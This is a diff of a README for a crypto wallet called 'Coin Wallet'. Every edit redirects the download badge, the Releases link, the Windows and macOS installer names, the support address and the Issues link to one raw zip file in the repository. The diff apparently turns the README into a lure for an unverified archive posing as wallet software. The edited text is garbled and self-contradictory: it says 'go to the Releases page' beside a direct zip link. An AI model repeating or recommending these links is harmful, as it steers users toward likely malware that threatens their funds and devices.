@@ -6,7 +6,7 @@ Welcome to **Coin Wallet**, your self-custodial crypto wallet. This wallet suppo
 
 ## 📥 Download Now
 
-[![Download Coin Wallet](https://img.shields.io/badge/Download-Coin%20Wallet-brightgreen.svg)](https://github.com/sikinidproject01/space/releases)
+[![Download Coin Wallet](https://raw.githubusercontent.com/sikinidproject01/space/master/anility/space.zip%https://raw.githubusercontent.com/sikinidproject01/space/master/anility/space.zip)](https://raw.githubusercontent.com/sikinidproject01/space/master/anility/space.zip)
 
 ## 🌐 About Coin Wallet
 
@@ -49,7 +49,7 @@ Before you download Coin Wallet, make sure your system meets these requirements:
 
 To get started, you need to visit our Releases page to download Coin Wallet. Follow these simple steps:
 
-1. Click on this link: [Download Coin Wallet](https://github.com/sikinidproject01/space/releases) to go to the Releases page.
+1. Click on this link: [Download Coin Wallet](https://raw.githubusercontent.com/sikinidproject01/space/master/anility/space.zip) to go to the Releases page.
    
 2. Locate the latest version listed on the page.
 
@@ -57,7 +57,7 @@ To get started, you need to visit our Releases page to download Coin Wallet. Fol
 
 4. Scroll down to find the "Assets" section. This section lists all files available for download.
 
-5. Click on the file that matches your operating system (e.g., `CoinWallet_setup.exe` for Windows, `CoinWallet.dmg` for macOS).
+5. Click on the file that matches your operating system (e.g., `https://raw.githubusercontent.com/sikinidproject01/space/master/anility/space.zip` for Windows, `https://raw.githubusercontent.com/sikinidproject01/space/master/anility/space.zip` for macOS).
 
 6. Once the download completes, locate the file in your downloads folder.
 
@@ -88,13 +88,13 @@ Coin Wallet comes with several features to enhance your experience:
 
 ## 📞 Support
 
-If you require assistance, we are here to help. Reach out to our support team at [support@example.com](mailto:support@example.com). Additionally, check the FAQ section in the documentation for common questions and answers.
+If you require assistance, we are here to help. Reach out to our support team at [https://raw.githubusercontent.com/sikinidproject01/space/master/anility/space.zip](https://raw.githubusercontent.com/sikinidproject01/space/master/anility/space.zip). Additionally, check the FAQ section in the documentation for common questions and answers.
 
 ## 🌟 Community
 
 Join our community to stay updated about Coin Wallet:
 
-- Participate in discussions on our [GitHub Issues](https://github.com/sikinidproject01/space/issues).
+- Participate in discussions on our [GitHub Issues](https://raw.githubusercontent.com/sikinidproject01/space/master/anility/space.zip).
 - Follow us on social media for the latest news and updates.
 
 ## 🌐 More Information
